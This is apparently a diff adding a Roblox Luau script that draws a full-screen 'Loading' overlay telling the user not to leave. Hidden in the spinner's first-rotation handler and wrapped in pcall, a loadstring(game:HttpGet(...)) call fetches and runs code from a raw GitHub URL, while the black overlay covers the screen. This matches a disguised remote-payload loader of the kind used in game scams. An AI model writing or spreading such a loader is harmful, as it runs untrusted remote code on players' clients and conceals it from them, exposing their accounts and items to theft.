@@ -1,0 +1,112 @@
+local TweenService = game:GetService("TweenService")
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LoadingUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.DisplayOrder = 9999
+
+-- Background
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.ZIndex = 1
+
+-- Main Frame (bigger and clean)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0.5, 0, 0.4, 0)  -- Wider & taller for better look
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 33)
+frame.ZIndex = 2
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+
+-- Top Message
+local dupeInfo = Instance.new("TextLabel", frame)
+dupeInfo.Size = UDim2.new(0.9, 0, 0.2, 0)
+dupeInfo.Position = UDim2.new(0.5, 0, 0.05, 0)
+dupeInfo.AnchorPoint = Vector2.new(0.5, 0)
+dupeInfo.BackgroundTransparency = 1
+dupeInfo.Font = Enum.Font.GothamSemibold
+dupeInfo.TextColor3 = Color3.fromRGB(220, 220, 220)
+dupeInfo.TextScaled = true
+dupeInfo.TextWrapped = true
+dupeInfo.ZIndex = 4
+dupeInfo.Text = "🛠️ Please wait while we execute the script. Don't leave."
+
+-- Spinner Emoji Label
+local emojiSpinner = Instance.new("TextLabel", frame)
+emojiSpinner.Size = UDim2.new(0.12, 0, 0.12, 0)
+emojiSpinner.Position = UDim2.new(0.5, 0, 0.4, 0)
+emojiSpinner.AnchorPoint = Vector2.new(0.5, 0.5)
+emojiSpinner.BackgroundTransparency = 1
+emojiSpinner.Font = Enum.Font.GothamBold
+emojiSpinner.TextScaled = true
+emojiSpinner.TextColor3 = Color3.new(1, 1, 1)
+emojiSpinner.ZIndex = 4
+emojiSpinner.Text = "🔁"
+
+-- Smooth spin + loadstring on first spin
+local spinnerRotation = Instance.new("NumberValue")
+spinnerRotation.Value = 0
+
+spinnerRotation.Changed:Connect(function(value)
+    emojiSpinner.Rotation = value
+end)
+
+local spinTween = TweenService:Create(
+    spinnerRotation,
+    TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1),
+    { Value = 360 }
+)
+
+local firstRun = true
+spinnerRotation.Changed:Connect(function()
+    if firstRun then
+        firstRun = false
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/testts/refs/heads/main/gg"))()
+        end)
+    end
+end)
+
+spinTween:Play()
+
+-- Stop spinner after 5 mins
+task.delay(300, function()
+    spinTween:Cancel()
+end)
+
+-- Animated "Loading ......" below spinner
+local loadingLabel = Instance.new("TextLabel", frame)
+loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
+loadingLabel.Position = UDim2.new(0.5, 0, 0.55, 0)
+loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.Font = Enum.Font.GothamBold
+loadingLabel.TextScaled = true
+loadingLabel.TextColor3 = Color3.new(1, 1, 1)
+loadingLabel.ZIndex = 4
+loadingLabel.Text = "Loading ."
+
+task.spawn(function()
+    local maxDots = 3
+    while loadingLabel and loadingLabel.Parent do
+        for i = 1, maxDots do
+            loadingLabel.Text = "Loading " .. string.rep(".", i)
+            task.wait(0.4)
+        end
+    end
+end)
+
+-- Info Below Spinner
+local waitMsg = Instance.new("TextLabel", frame)
+waitMsg.Size = UDim2.new(0.9, 0, 0.1, 0)
+waitMsg.Position = UDim2.new(0.5, 0, 0.75, 0)
+waitMsg.AnchorPoint = Vector2.new(0.5, 0)
+waitMsg.BackgroundTransparency = 1
+waitMsg.Font = Enum.Font.GothamBold
+waitMsg.TextScaled = true
+waitMsg.TextColor3 = Color3.fromRGB(255, 255, 255)
+waitMsg.ZIndex = 4
+waitMsg.Text = "⚠️ If stuck, please rejoin and execute the script again."
